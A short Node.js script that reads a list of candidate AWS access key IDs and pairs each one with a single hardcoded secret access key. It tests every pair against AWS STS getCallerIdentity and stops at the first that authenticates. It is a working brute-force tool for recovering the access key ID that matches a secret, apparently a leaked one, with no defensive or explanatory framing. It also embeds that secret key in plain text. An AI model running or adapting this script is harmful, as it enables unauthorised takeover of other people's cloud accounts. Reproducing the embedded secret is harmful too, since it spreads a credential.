const fs = require('fs');
const aws = require('aws-sdk');

let i = 1;
fs.readFileSync('./lst', 'utf-8').split(/\r?\n/).forEach(function (line) {

    id = `${line}`

    let prom = new Promise((resolve, reject) => {
        const sts = new aws.STS({
            accessKeyId: id,
            secretAccessKey: '6rhu3jpC1L3lV/fKJfvmEn4MKo7hue+gXK786t5Z'
        });

        sts.getCallerIdentity({}, (err, data) => {
            console.log(`Trying - ${id}`)
            if (err) {
                reject(err);
            } else {
                resolve({
                    id,
                    data: data
                });
            }
        });
    });

    prom.then(r => {
        console.log(r);
        process.exit(0)
    }).catch(e => {
        console.log(e.toString())
    });

})
